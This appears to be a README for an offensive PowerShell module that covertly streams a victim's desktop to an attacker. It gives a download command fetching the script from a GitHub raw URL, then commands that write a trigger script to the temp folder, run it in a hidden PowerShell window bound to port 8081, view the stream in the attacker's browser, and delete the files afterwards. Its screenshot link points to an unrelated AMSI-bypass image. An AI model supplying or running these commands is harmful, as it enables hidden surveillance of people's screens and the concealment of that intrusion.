## Stream-TargetDesktop.ps1

|Function name|Description|Privileges|Notes|
|---|---|---|---|
|Stream-TargetDesktop|Stream target desktop live|User Land|Dependencies: firefox browser (attacker)<br />[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/AMSBP.png)|

<br />

**downloadcmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Stream-TargetDesktop/Stream-TargetDesktop.ps1" -OutFile "Stream-TargetDesktop.ps1"
```

**execute:**
```powershell
#Build triggers script
echo "Import-Module -Name $Env:TMP\Stream-TargetDesktop.ps1 -Force"|Out-File -FilePath "$Env:TMP\trigger.ps1" -Encoding ascii -Force
Add-Content -Path "$Env:TMP\trigger.ps1" -Value "TargetScreen -Bind -Port 8081"


#Start capture desktop
Start-Process -WindowStyle hidden powershell -ArgumentList "-File $Env:TMP\trigger.ps1"

#Access live stream
Start firefox on: "http://${RemoteHost}:${BindPort}"


#Stop stream
$StreamPid = Get-Content -Path "$Env:TMP\mypid.log" -EA SilentlyContinue|Where-Object { $_ -ne '' }
Stop-Process -id $StreamPid -EA SilentlyContinue -Force

#CleanUp
Remove-Item -Path "$Env:TMP\trigger.ps1" -Force
Remove-Item -Path "$Env:TMP\mypid.log" -Force
```
